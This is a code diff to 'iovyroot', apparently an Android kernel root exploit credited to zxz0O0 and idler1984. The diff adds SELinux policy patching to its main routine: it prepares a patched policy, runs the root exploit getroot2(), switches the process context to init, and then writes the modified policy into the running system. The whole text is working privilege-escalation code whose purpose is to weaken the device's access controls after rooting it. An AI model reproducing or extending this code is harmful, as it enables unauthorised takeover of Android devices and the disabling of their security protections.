@@ -15,6 +15,7 @@
 #include "policydb.h"
 #include "offsets.h"
 #include "selinux.h"
+#include "policy.h"
 
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
@@ -427,6 +428,7 @@ int main(int argc, char* argv[])
 	unsigned int i;
 	int ret = 1;
 	struct offsets2* o;
+	policy_t patched_sepolicy = NULL;
 
 	printf("iovyroot by zxz0O0\n");
 	printf("poc by idler1984\n\n");
@@ -441,6 +443,8 @@ int main(int argc, char* argv[])
 		return 1;
 	if(initmappings())
 		return 1;
+
+	patched_sepolicy = prepare_policy();
 
 	ret = getroot2(o);
 	//let the threads end
@@ -459,6 +463,14 @@ int main(int argc, char* argv[])
 		if(ret != 0) {
 			printf("set scontext to u:r:init:s0 error!\n");
 			return -1;
+		}
+
+		if(patched_sepolicy != NULL) {
+			ret = patch_policy(patched_sepolicy);
+			if(ret != 0) {
+				printf("patch sepolicy error!\n");
+			}
+			destroy_policy(patched_sepolicy);
 		}
 
 		if(argc <= 1)
